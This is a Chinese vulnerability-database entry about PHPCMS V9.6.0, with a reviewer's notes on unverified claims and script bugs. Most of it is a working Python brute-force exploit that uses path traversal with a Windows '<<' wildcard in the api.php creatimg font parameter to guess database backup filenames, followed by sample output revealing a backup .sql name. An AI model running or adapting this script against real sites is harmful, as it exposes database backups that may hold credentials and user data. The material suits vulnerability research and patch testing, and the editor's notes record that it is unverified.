---
source: "hatch 补库批 20260928"
product: "PHPCMS9.6.0 creatimg"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Phpcms V9.6.0 数据库备份爆破"
prerequisites: "来源所述条件，未列明部分仍待核：存在备份、font路径可遍历，<<通配/截断相关Windows运行条件待说明"
side_effects: "未执行；本文需注意的操作影响：permutations不能覆盖重复字符前缀，末字符#在尝试前退出永不测试；字符集遗漏i，最大长度固定"
source_status: "unknown"
id: "vw-9c2e6baeba80513e10d13c73"
entity_id: "ve-9c2e6baeba80513e10d13c73"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：存在备份、font路径可遍历，&lt;&lt;通配/截断相关Windows运行条件待说明

- **证据待核（1）**：脚本靠PNG字样判路径存在，未给源码/oracle差异或平台解释。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **操作与副作用边界（2）**：permutations不能覆盖重复字符前缀，末字符#在尝试前退出永不测试；字符集遗漏i，最大长度固定。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **证据待核（3）**：没有超时/速率/异常处理；仅知道备份名不等于可下载文件内容，无最终HTTP响应和来源。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Phpcms V9.6.0 数据库备份爆破

一、漏洞简介
------------

二、漏洞影响
------------

Phpcms V9.6.0

三、复现过程
------------

    #!/usr/bin/env python
    # coding=utf-8
    '''/*
        * author = Mochazz
        * team   = 红日安全团队
        * env    = pyton3
        *
        */
    '''
    import requests
    import itertools
    characters = "abcdefghjklmnopqrstuvwxyz0123456789_!#"
    backup_sql = ""
    payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
    url = "http://www.0-sec.org"
    flag = 0
    for num in range(1, 7):
        if flag:
            break
        for pre in itertools.permutations(characters, num):
            pre = ''.join(list(pre))
            payload = payload.format(location=pre)
            r = requests.get(url+payload)
            if r.status_code == 200 and "PNG" in r.text:
                flag = 1
                backup_sql = pre
                payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
                break
            else:
                payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
    print("[+] 前缀为：", backup_sql)
    flag = 0
    for i in range(30):
        if flag:
            break
        for ch in characters:
            if ch == characters[-1]:
                flag = 1
                break
            payload = payload.format(location=backup_sql+ch)
            r = requests.get(url + payload)
            if r.status_code == 200 and "PNG" in r.text:
                backup_sql += ch
                print("[+] ", backup_sql)
                payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
                break
            else:
                payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

    print("备份sql文件地址为：", backup_sql+".sql")

结果为：

    C:\Users\dell\Desktop>python Zxc.py
    [+] 前缀为： 1
    [+]  12
    [+]  123
    [+]  1231
    [+]  12312
    [+]  123123
    [+]  1231231
    [+]  12312312
    [+]  123123123
    备份sql文件地址为： 123123123.sql
